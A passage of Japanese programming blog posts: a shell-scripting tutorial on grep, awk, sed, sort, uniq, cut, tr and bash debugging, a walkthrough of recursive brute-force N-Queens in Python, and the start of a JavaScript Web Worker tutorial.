\u0026#34;$grepvar\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34; fi $ bash test 検索したいファイル名を指定して下さい。 grepfile.txt 検索したい語句を入力して下さい。 linux $ 入力は「linux」（小文字のエル）ですが、ファイル内のテキストは「Linux」（大文字のエル）で書かれているため、検索結果には何も表示されません。ここでは、grepコマンドに「-i」のフラグを追加するだけで、この大文字と小文字を区別する問題に対処する必要があります。\n#!/bin/bash echo \u0026#34;検索したいファイル名を指定して下さい。\u0026#34; # 入力を grepfile.txt read fileName if [[ -f \u0026#34;$fileName\u0026#34; ]]; then echo \u0026#34;検索したい語句を入力して下さい。\u0026#34;; read grepvar; # 大文字小文字の区別をしないオプション -i grep -i \u0026#34;$grepvar\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34; fi $ bash grep2.sh 検索したいファイル名を指定して下さい。 grepfile.txt 検索したい語句を入力して下さい。 linux This is Linux This is Linux This is Linux This is Linux $ 出力で行番号を抽出することもできます。このためには、grepコマンドに「-n」の別のフラグを追加するだけです。\n#!/bin/bash echo \u0026#34;検索したいファイル名を指定して下さい。\u0026#34; # 入力を grepfile.txt read fileName if [[ -f \u0026#34;$fileName\u0026#34; ]]; then echo \u0026#34;検索したい語句を入力して下さい。\u0026#34;; read grepvar; # 大文字小文字の区別をしないオプション -i grep -in \u0026#34;$grepvar\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34; fi $ bash grep3.sh 検索したいファイル名を指定して下さい。 grepfile.txt 検索したい語句を入力して下さい。 linux 1:This is Linux 4:This is Linux 7:This is Linux 10:This is Linux $ ドキュメント内の特定の単語の発生回数を取得することもできます。grepコマンド「grep -i -c $grepvar $fileName」に「-c」フラグを追加し、スクリプトを保存し、端末を使用して実行します。\n#!/bin/bash echo \u0026#34;検索したいファイル名を指定して下さい。\u0026#34; # 入力を grepfile.txt read fileName if [[ -f \u0026#34;$fileName\u0026#34; ]]; then echo \u0026#34;検索したい語句を入力して下さい。\u0026#34;; read grepvar; # 大文字小文字の区別をしないオプション -i grep -inc \u0026#34;$grepvar\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34; fi $ bash test 検索したいファイル名を指定して下さい。 grepfile.txt 検索したい語句を入力して下さい。 linux 4 $ awkコマンド awkは、データの操作やレポートの作成に使用されるスクリプト言語です。\nコンパイルを必要とせず、変数、数値関数、文字列関数、論理演算子が使用できます。\n何より処理が高速です。bashよりも高速である場合が多いです。\nこのトピックでは、シェルスクリプトで多く多用されるawkコマンドの一例を紹介します。\n$ cat grepfile.txt | awk \u0026#39;{ print; }\u0026#39;; This is Linux This is Windows This is MAC This is Linux This is Windows This is MAC This is Linux This is Windows This is MAC This is Linux This is Windows This is MAC $ 「awk」を使用して特定のパターンを検索することもできます。\n$ cat grepfile.txt | awk \u0026#39;/Linux/ { print; }\u0026#39;; This is Linux This is Linux This is Linux This is Linux $ 次の例では、プログラムがターゲットワードを見つけた行からコンテンツを抽出する方法を見ていきます。 「$1」はその行の最初の単語を表し、同様に「$2」は2番目を表し、「$3」は3番目の単語を表し、「$4」はこの場合最後の単語を表します。\n$ cat grepfile.txt | awk \u0026#39;/Linux/ { print $3; }\u0026#39;; Linux Linux Linux Linux $ ヒント awkはとても優れたプログラミング言語で、シェル薬婦とを学ぶことと同じほどのボリュームのある言語です。ただ、シェルスクリプトで使われる多くのbashコマンドを使いこなすことで、awkでないとできないことは限られます。まずはこのトピックで使われるawkコマンドの利用例を身につければオッケーです。すこしずつ覚えていくことを増やしていけばよいのです。 sedコマンド sedコマンドはストリームエディタの略で、標準入力またはファイルからのテキストの編集操作を実行します。\nこのトピックでは「i」を「I」に置き換えます。\nそのためには、次の sed コマンド \u0026lsquo;cat grepfile.txt | sed -e \u0026rsquo;s/i/I/\u0026rsquo; と書くだけで、cat コマンドを使用してファイルの内容を取得し、パイプ \u0026lsquo;|\u0026rsquo; 記号の後に、\u0026lsquo;sed\u0026rsquo; キーワードを使用して、このケースを置き換える操作を指定します。\n「s」はスラッシュと置き換えると言う意味です。\n「-e」はsed コマンドを連続してフィルタリングすることを可能とするオプションです。\n/置き換え前/置き換え後/\nとなります。\n$ cat grepfile.txt | sed -e \u0026#34;s/i/I/\u0026#34; ThIs is Linux ThIs is Windows ThIs is MAC ThIs is Linux ThIs is Windows ThIs is MAC ThIs is Linux ThIs is Windows ThIs is MAC ThIs is Linux ThIs is Windows ThIs is MAC $ 最初に出てくる \u0026lsquo;This is Linux\u0026rsquo; が \u0026lsquo;ThIs is Linux\u0026rsquo; となったことが解ります。\n-g オプションを末尾につけることで、複数回の処理で置き換えます。\n$ cat grepfile.txt | sed -e \u0026#34;s/i/I/g\u0026#34; ThIs Is LInux ThIs Is WIndows ThIs Is MAC ThIs Is LInux ThIs Is WIndows ThIs Is MAC ThIs Is LInux ThIs Is WIndows ThIs Is MAC ThIs Is LInux ThIs Is WIndows ThIs Is MAC $ 以下のコマンドで、処理結果を簡単にファイルに出力して、エディターなどで開いて確認する事ができます。\ncat filegrep.txt | sed -e \u0026#39;s/i/I/g\u0026#39; \u0026gt; newfile.txt 単語全体を別の単語に置き換えることもできます。たとえば、以下に示すスクリプトでは、「Linux」のすべてのインスタンスが端末に表示中に「Unix」に置き換えられます。\n$ cat grepfile.txt | sed -e \u0026#34;s/Linux/Unix/g\u0026#34; This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC $ sortコマンド テキストファイルを行単位で並べ替える\nsort 並べ替える\nsort -n 数値扱いで並べ替える\nsort -r 逆順で出力\nまずは以下の読み込み用サンプルファイルを準備します。\nname:ヤムチャ skill:狼牙風風拳 name:孫悟空 skill:かめはめ波 name:ピッコロ skill:魔貫光殺砲 name:ヤムチャ skill:繰気弾 name:孫悟空 skill:元気玉 name:クリリン skill:気円斬 name:ヤムチャ skill:かめはめ波 name:クリリン skill:かめはめ波 name:孫悟空 skill:ジャン拳 name:ヤムチャ skill:新狼牙風風拳 $ cat sample.txt | grep -o \u0026#34;name:\\S*\u0026#34; | sort name:孫悟空 name:孫悟空 name:孫悟空 name:クリリン name:クリリン name:ピッコロ name:ヤムチャ name:ヤムチャ name:ヤムチャ name:ヤムチャ 解説\ngrep -E\n検索に「拡張正規表現」を使えるようにする。\n^[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3} でIPアドレスに一致させる。\ngrep -o\n通常の grep では一致した行全体が表示されるが、-o を指定することにより一致した文字のみを表示させることができる。\nsort\n次の uniq で重複行のカウントを行うため、並び替える。\nuniqコマンド uniq -c\n重複行のカウントを表示する。\n$ cat sample.txt | grep -o \u0026#34;name:\\S*\u0026#34; | sort | uniq -c 3 name:孫悟空 2 name:クリリン 1 name:ピッコロ 4 name:ヤムチャ $ sort -r 逆順 sort -r\nカウントの降順で並べ替える。\n$ cat sample.txt | grep -o \u0026#34;name:\\S*\u0026#34; | sort | uniq -c | sort -r 4 name:ヤムチャ 3 name:孫悟空 2 name:クリリン 1 name:ピッコロ cutコマンド cut:タブ区切りでフィールドを選択して出力する\ncut -d:デリミタを指定。いわゆる区切り文字\ncut -f:抽出するフィールドの番号を指定する。上記コマンドで1を指定した場合は二つ目の\u0026quot;name\u0026quot;が抽出される。\n$ cat sample.txt | grep -o \u0026#34;name:\\S*\u0026#34; | sort | uniq -c | sort -r | cut -d \u0026#34;:\u0026#34; -f2 ヤムチャ 孫悟空 クリリン ピッコロ $ headコマンド 長いメッセージやテキストファイルの先頭だけ／末尾だけを表示する\nhead -n\nn: 出力する行数を指定する。\n$ cat sample.txt | grep -o \u0026#34;name:\\S*\u0026#34; | sort | uniq -c | sort -r | cut -d \u0026#34;:\u0026#34; -f2 | head -n2 ヤムチャ 孫悟空 $ trコマンド テキストファイルの文字を置換する／削除する\n「-d」オプションで、指定した文字を削除することができます。例えば、Windows環境で作成したテキストファイルの改行コードを、Linux環境向けに置き換えるといった用途に使用できます。\n$ cat sample.txt name:ヤムチャ skill:狼牙風風拳 name:孫悟空 skill:かめはめ波 name:ピッコロ skill:魔貫光殺砲 name:ヤムチャ skill:繰気弾 name:孫悟空 skill:元気玉 name:クリリン skill:気円斬 name:ヤムチャ skill:かめはめ波 name:クリリン skill:かめはめ波 name:孫悟空 skill:ジャン拳 name:ヤムチャ skill:新狼牙風風拳 $ cat sample.txt | tr -d \u0026#39;\\n\u0026#39; name:ヤムチャ skill:狼牙風風拳name:孫悟空 skill:かめはめ波name:ピッコロ skill:魔貫光殺砲name:ヤムチャ skill:繰気弾name:孫悟空 skill:元気玉name:クリリン skill:気円斬name:ヤムチャ skill:かめはめ波name:クリリン skill:かめはめ波name:孫悟空 skill:ジャン拳name:ヤムチャ skill:新狼牙風風拳 $ Windows環境では、改行を「CR」（16進数0D）と「LF」（16進数0A）の2バイトで表しますが、Linux環境では「LF」のみです。trコマンドでは「CR」を「\\r」で表すことができるので、「tr -d \\r」としてテキストファイルから「CR」を除去することで、Linux環境用の改行コードに変換できます。\n「-s」オプションでは、指定した文字が連続している場合には1つにまとめることができます。例えば、「tr -s \u0026ldquo;\\r\u0026rdquo;」では、連続した改行を1つにします。catコマンドの「-s」オプションと同じ働きになります。\nヒント trコマンドの \u0026lsquo;\\n\u0026rsquo; はシングルクォーテーションで囲む必要があります。 スクリプトのデバッグ Bashは広範なデバッグ機能を提供しています。\nデバッグの方法は３種類あります\n１．ターミナルの実行時に -x オプションを付与する\n$ bash -x helloScript.sh ２．ソースコードの冒頭のシェバンに -x オプションを付与する\n#!/bin/bash -x : : ３．デバッグの開始点と終了点を決めてデバッグ\nデバッグの開始点にコマンド \u0026lsquo;set -x\u0026rsquo;終了点には \u0026lsquo;set +x\u0026rsquo; と書きます。\n#!/bin/bash set -x echo \u0026#34;置き換えたいファイル名を入寮して下さい。\u0026#34; read fileName set +x if [[ -f \u0026#34;$fileName\u0026#34; ]]; then sed -e \u0026#34;s/Linux/Unix/g\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34;; fi $ bash test + echo 置き換えたいファイル名を入寮して下さい。 置き換えたいファイル名を入寮して下さい。 + read fileName grepfile.txt + set +x This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC $ #!/bin/bash # デバッグ開始 set -x var1=`date +%M` # デバッグ終了 set +x var2=`ls -1 | wc -l` var3=\u0026#34;DEBUG TEST\u0026#34; exit 0 $ bash debug3.sh ++ date +%M + var1=56 + set +x $ ヒント だいたい解ってきたのではないかと思います。 要するにシェルスクリプトは「｜パイプ」で繋いで連続する処理をフィルタリングして、目的の結果に近づけていくというものです。 関数を使って、より長く複雑なことも実行可能です。 Linux(CUI)でできることはすべてシェルスクリプトでできます。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-02T15:55:47+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/","title":"【grep/sed/awkも】ざっくりわかるシェルスクリプト５」"},{"content":"グローバル変数 今回は、前回からの引き続きでブルートフォース力任せ探索のプログラムの詳細部分を説明します。\nプログラムのソースは以下のURLをご覧ください。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py01_nqueen.py\nまず、グローバル変数を見ていきましょう。\n417~420行目で設定しています。\n417行目 MAX、418行目 SIZEでNの数を指定します。\nプログラムは8ですが、動作を説明するために4に変更してみてください。\nMAX = 4 SIZE = 4 以降はN=4の問題として説明します。\n419行目 ABOARDという配列を宣言しクイーンを置いていきます。\nABOARD = [0 for i in range(MAX)]で4個の要素を0で初期化しています。\nABOARD = [0,0,0,0] と同じです。\nABOARD[0]は1行目のクイーンを置く位置です0から3までの数字が入ります。\nABOARD[0]が3だと右から4番目にクイーンを置く感じになります。\n420行目 COUNT=0 でCOUNTを初期化しています。\nnqueenメソッド グローバル変数の宣言が終わったら441行目でnqueenメソッドが呼び出されます。\n439行目でnqueenメソッドを再帰的に呼び出しているのが最も特徴的です。\n全体の動作については次の「再帰について」で図を交えて説明しますが前提として各行が何をしているか押さえましょう。\nglobal ABOARD 433行目で global ABOARDとして変数宣言しています。\n関数内でグローバル変数に値を代入したい場合は、変数宣言時にglobalをつける必要があります。\nglobalをつけないとローカル変数として扱われます。\nちなみに、私は試しに433行目を削除して実行してみたのですがエラーになりました。\nif row is SIZE: printout() 434行目 if row is SIZE: はrowイコールSIZEという意味です。\nif row == SIZE: としても今回は同じ動きになります。\n434-435行でやっていることは434行目のif文で最終行までクイーンを置き終わっているかどうかを判定し置き終わっていたらprintoutメソッドを呼び出してCOUNT数と各行のクイーンの設置場所を出力します。\nfor i in range(SIZE) 437行目 for i in range(SIZE) は0からスタートしてSIZEの回数分0,1,2,3と1ずつインクリメントしながらfor文を回します。\nやっていることは各行にクイーンを設置する場所を右から左に1個ずつずらしています。1番左端までいったらfor文を抜けます。\nABOARD[row] = i 438行目のABOARD[row]=iでクイーンを設置しています。\nrowは行を意味します。0からスタートして0,1,2,3まであります。\n例えば、0だと1行目、3だと4行目となります。\niはクイーンを設置する列になります。\n0からスタートして0,1,2,3まであります。\n例えば、0だと右から1列目、3だと右から4列目となります。\n例えばABOARD[2]=3 の場合は\n3行目は右から4列目にクイーンを置くことになります。\nnqueen(row+1) 439行目のnqueen(row+1)で再帰的にnqueenメソッドを呼び出しています。\nやっていることは次の行への移動です。\n再帰の動きについて 再帰の基本的な動作で押さえたいのは以下の2つです。\n・再帰を呼び出した時の動作\n通常のメソッド呼び出しと同じです。メソッドの先頭に移動します。引数に渡された値が反映されます。\n・再帰から抜ける時の動作\n再帰から抜けると1階層前に戻り再帰を呼び出した場所の次の行に移動します。\n変数の状態は再帰を呼び出す直前の状態に戻ります。\n再帰の呼び出しが実際にどういう動きになっているかは頭で考えても難しいので図を見ながら説明します。\n444行目でnqueenを0を渡して呼び出します(1階層目)。\n432行目からスタートして\nrow=0なので436行目のelse:に行きそのまま437行目のfor文に入ります\n最初のfor文なのでi=0です。\nrow=0なので\nABOARD[0]=0\nで\n1行目の右端にクイーンを置きます。\n図 439行目で再帰的にnqueenを呼び出します。\nrow=0 row+1=1なので\nnqueenを引数1を渡して呼び出します(2階層目)\n432行目からスタートして\nrow=1なので436行目のelse:に行きそのまま437行目のfor文に入ります\n最初のfor文なのでi=0です。\nさっきもfor文が出てきましたが再帰は階層ごとにローカル変数を別に考える必要があります。\nrow=1なので\nABOARD[1]=0\nで\n2行目の右端にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数2を渡して呼び出します(3階層目)。\n同様にfor文に入り、i=0 row=2なので\nABOARD[2]=0\nで\n3行目の右端にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数3を渡して呼び出します(4階層目)。\n同様にfor文に入り、i=0 row=3なので\nABOARD[3]=0\nで\n4行目の右端にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。\nrow=4なのでif row is SIZE:でprintout()メソッドを呼び出してCOUNTと各行のクイーンの位置を出力します。\nprintout()後再帰から抜けて4階層目の439行目の後ろに移動します。\n変数は再帰を呼び出す直前のものに戻るのでrowは3 iは0になります。\nfor文の中にあるのでiを1インクリメントしてiは1になり次のfor文に移動します。\n_\nABOARD[3]=1\nで\n4行目の右から2番目にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。\nrow=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。\nfor文の中にあるのでiを1インクリメントしてiは2になり次のfor文に移動します。\n_\nABOARD[3]=2\nで\n4行目の右から3番目にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。\nrow=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。\nfor文の中にあるのでiを1インクリメントしてiは3になり次のfor文に移動します。\n_\nABOARD[3]=3\nで\n4行目の右から4番目にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。\nrow=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。\nfor文でiを1インクリメントすると4ですがrange(4)だと0,1,2,3までなのでここでfor文を抜けます。\nfor文を抜けると439行目には移動しないので再帰から抜けて3階層目の439行目に移動します。\n3階層目ではrow=2 iは0です。\nfor文の中にあるのでiを1インクリメントしてiは1になり次のfor文に移動します。\nABOARD[2]=1\n図 439行目で再帰的にnqueenを引数3を渡して呼び出します(4階層目)。\nrow=3なので436行目のelse:に行きそのまま437行目のfor文に入ります\n最初のfor文なのでi=0です。\nABOARD[3]=0\n図 439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。\nrow=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。\nという感じで下の階層からfor文でぐるぐる回転しながらうごいてゆきます。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-01T15:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/","title":"第2回 pythonでNQueen（エイトクイーン）ブルートフォース　力任せ探索（２）"},{"content":"javascriptで重い処理を書く際やforやwhileなどのループを記述する際に気をつけないといけないのがUIロックです。\nとくに重い処理を行うと、jsの処理に力を使ってしまって画面が固まってUIなどの操作性が格段に落ちてしまい、ブラウザなどからは応答に時間がかかっておりますといったアラートが表示される原因になります。\n画面ロックが発生してしまうと、ユーザーは何もできなくなってしまうのでブラウザを強制終了するしかありません。そうなってしまうと、せっかくサイトに来た訪問者が何もせずに離脱して行くことにつながってしまいます。場合によっては、そのような問題が発生するサイトには二度とこないかもしれません。\nそうした不具合や不具合やサイトの離脱を防ぐためにもjavascriptを使って重い処理をときはWorkerを使って重い処理を別タスクとして実行することをオススメします。\n画面上の処理と重い処理を分けることができ、その結果画面をロックすることなく表示させることが可能になります。\n今回はその方法を詳しく説明しますので、よろしくおねがいします。\nUIをロックしてしまうループ処理 まずは画面をロックしてしまうような記述です。\n下記のようなHTMLがあったとしましょう。\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;ja\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; #animation:before { content: \u0026#34;\u0026#34;; width: 5em; height: 5em; display: block; border: 2px solid black; margin: 50px auto; } @keyframes rotation { 0%{ transform: rotate(0);} 100%{ transform: rotate(360deg); } } .run #animation:before { animation: 2s linear infinite rotation; } .run button { background-color: red; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;animation\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; onClick=\u0026#34;run()\u0026#34;\u0026gt;Run\u0026lt;/button\u0026gt; \u0026lt;h1 id=\u0026#34;counter\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h2 id=\u0026#34;time\u0026#34;\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; このHTMLはcounter部分に文字を出力できるようにしてあります。\nそして、実行時間をtime部分に出力します。\nあまり使うことはないですが、今回は重い処理を行った場合を再現するということでこのような形にしました。\nそれでは、ここにfor文を使って文字を追加していってみましょう。今回はfor文が重い処理を行うという部分になります。\njsonやxml、データの解析や要素でforやwhile、eachなどを使うことは非常に多く、その後に何らかの処理を行うという記述もjavascriptを使っていれば高頻度で使用します。\nconst run = () =\u0026gt; { document.body.classList.add(\u0026#39;run\u0026#39;); const start = Date.now(); const elem = document.querySelector(\u0026#34;#counter\u0026#34;); for(let i = 0; i \u0026lt; 100000; i++) { elem.textContent = i; } document.querySelector(\u0026#34;#time\u0026#34;).textContent = Date.now() - start; document.body.classList.remove(\u0026#39;run\u0026#39;); }; 上のようなfor文で記述したスクリプトを作ってみました。\niの値をcounterに反映していくだけのものです。\nまずはiの最大値を100,000くらいで実行してみましょう。\n10万件のデータをフロントで処理するなと思うかもしれませんが、あくまで重い処理を行うとどうなるかという実験です。\n10万件でなくても、数千件のデータで入れ子のループ処理が記述されている場合などは画面ロックが発生する確率も上がっていきます。\n実行したところ、999,999と表示され、time部分の処理は569ミリ秒ということになります。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. ここで注目してほしいのが、counterの文字を変化させているにもかかわらず、その文字が反映されていないという点です。\nChromeのDevelopper tools（macの場合[⌘ + option + i], Windowsの場合[Ctrl + Shift + I]または、F12）で確認しても、変化しているようではありますが、画面上では反映されていません。\n重い処理を行う場合をフロントで行うと、 UX（ユーザー体験）の低下につながってしまいます。\nそこで使うのが、 javascriptのタスクを別スレッドで実行できるWorker処理ということになります。\nWorkerとは Workerとはバックグランド、つまり、裏の方で処理を行ってその結果をフロントに返却するということができる仕組みになります。\nフロントで処理を行わないので、画面ロックを発生させることなく重い処理を実行できます。\nWorkerを使用するには実行したいファイル名を指定して呼びします。\nそして、対象のワーカーに値などをpostMessageで値を渡します。\npostMessage部分は配列や連想配列のデータでも構いません。\nそして、対象のWorker側でpostされたデータを受信するように設定します。\n受信の際はフロントであれば worker.addEventListener('message', (e) =\u0026gt; {}) を、Workerであれば self.addEventListener('message', (e) =\u0026gt; {}) を使用します。\n処理内容を返却する際は、先ほどと同じようにpostMessageを使います。\nconst worker = new Worker(this.fileName); const run = () =\u0026gt; { worker.postMessage(\u0026#34;run\u0026#34;); }; worker.addEventListener(\u0026#39;message\u0026#39;, (e) =\u0026gt; { console.log(e.data); }, false); self.addEventListener(\u0026#39;message\u0026#39;, (e) =\u0026gt; { //処理内容 //処理結果を送信 self.postMessage(e.data); }, false); UIをロックしないで行えるループ それでは、先ほどロックしてしまったjsをworkerにしてみましょう。\nconst worker = new Worker(\u0026#34;worker.js\u0026#34;); const run = () 